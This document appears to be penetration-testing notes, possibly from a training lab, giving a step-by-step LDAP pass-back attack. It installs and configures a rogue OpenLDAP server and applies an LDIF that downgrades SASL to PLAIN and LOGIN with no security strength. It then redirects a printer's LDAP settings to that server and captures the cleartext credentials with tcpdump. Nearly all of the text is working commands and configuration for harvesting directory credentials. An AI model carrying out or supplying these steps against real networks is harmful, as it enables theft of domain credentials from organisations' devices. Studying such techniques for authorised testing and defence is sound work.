
## Ldap pass-back attack & Rogue LDAP server

We need to set up a rogue LDAP server to capture the credentials.

To install the slapd and LDAP-utils.

	sudo apt-get update && sudo apt-get -y install slapd ldap-utils 

Set any administrator password.

Next, Start configure the domain

dpkg-reconfigure -p low slapd

	1. Omit OpenLDAP server configuration? No
	2. DNS domain name: (AD domain name) i.e. testdomain.com
	3. Organization name: (AD domain name) i.e. testdomain.com
	4. Confrim with you administrator passwd which done by initial configuration.
	5. Do you want the database to be removed when slapd is purged? No
	6. Move old database files before creating a new database YES


	sudo systemctl enable slapd

	sudo systemctl start slapd

In order to obtain the clear-text credentials, we must reconfigure our LDAP server to only support the PLAIN and LOGIN authentication methods. To do this, we need to create a new LDIF file with the following information:

      #olcSaslSecProps.ldif

      dn: cn=config
      replace: olcSaslSecProps
      olcSaslSecProps: noanonymous,minssf=0,passcred

olcSaslSecProps: specifies the SASL security properties; noanonymous flag disables mechanisms that support anonymous login.
minssf: specifies the minimum acceptable security strength; 0 is for no protection.

Apply the new changes using the ldapmodify command and restart the LDAP server.

	 sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart 

To verify the modification:

	ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
	dn:
	supportedSASLMechanisms: PLAIN
	supportedSASLMechanisms: LOGIN

Change the server ip on printer webpage then start, Check the following error: "This distinguished name contains invalid syntax". If you receive this error, then use a tcpdump to capture the credentials.

   sudo tcpdump -SX -i breachad tcp port 389
